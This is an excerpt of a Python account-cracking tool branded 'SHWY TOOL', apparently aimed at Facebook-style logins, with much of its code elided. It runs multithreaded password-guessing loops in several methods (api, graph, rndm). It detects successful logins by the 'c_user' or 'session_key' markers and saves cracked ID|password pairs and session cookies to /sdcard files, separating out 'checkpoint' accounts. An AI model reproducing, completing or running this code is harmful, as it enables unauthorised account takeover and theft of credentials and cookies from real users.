...
print('\033[1;37m[\033[1;34m•\033[1;37m] \033[1;32mWELLCOM TO SHWY TOOL...\033[1;37m')
os.system('espeak -a 300 " Wellcome , To , SHWY , Tool,,"')
...
logo=("""\033[1;37m
  ...
  |     __|   |   |  |  |  |   |   |
  |__     |       |  |  |  |\     / 
  |_______|___|___|________| |___|\033[1;32m RX
\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;37m[\033[1;32m•\033[1;37m] \033[1;37mAuthor     :\033[1;32m SHWY-RX
\033[1;37m[\033[1;32m•\033[1;37m] \033[1;37mGithub     :\033[1;32m BANDA-RX
\033[1;37m[\033[1;32m•\033[1;37m] \033[1;37mStatus     :\033[1;32m PAID
\033[1;37m[\033[1;32m•\033[1;37m] \033[1;37mVersion    :\033[1;32m 0.0.2
\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
def linex():
        print('\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ')
def clear():
                      ...
                      #  print("\033[1;37m[\033[1;32m04\033[1;37m] \033[1;37mHow to use tutorial")
                        ...
                        if xd in ['1','01']:
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print("\033[1;37m[\033[1;32m•\033[1;37m] \033[1;32m𝐌𝐈𝐓 𝐖𝐀𝐒 𝐃𝐄𝐕𝐄𝐈𝐎𝐏𝐄𝐃 𝐁𝐘 𝐒𝐇𝐖𝐘")
                                        linex()
                                        #print("\033[1;37m[\033[1;32m•\033[1;37m] \033[1;32MIt Was Developed By Shwy")
                                        linex()
                                        for user in fo:
...
def api(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m[SHWY-M1] %s\033[1;32m [\033[1;32mOK-%s] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aws:
                                ...
                                print('\r\r\033[1;32m[SHWY-OK] %s | %s'%(ids,pas))
                                open('/sdcard/SHWY_OK_ids_M1.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/oussama_iDs_COOKiE_M1.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                                #open('/sdcard/oussama-M1-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aws:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m[SHWY-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SHWY-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m[SHWY-M2] %s\033[1;32m [\033[1;32mOK-%s] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
...
def graph(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m[SHWY-M3] %s\033[1;32m [\033[1;32mOK-%s] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
...
def graph1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [SHWY-M4] %s [OK-%s] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
...
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [SHWY-RX] %s /  OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [SHWY-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SHWY-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [SHWY-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SHWY-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
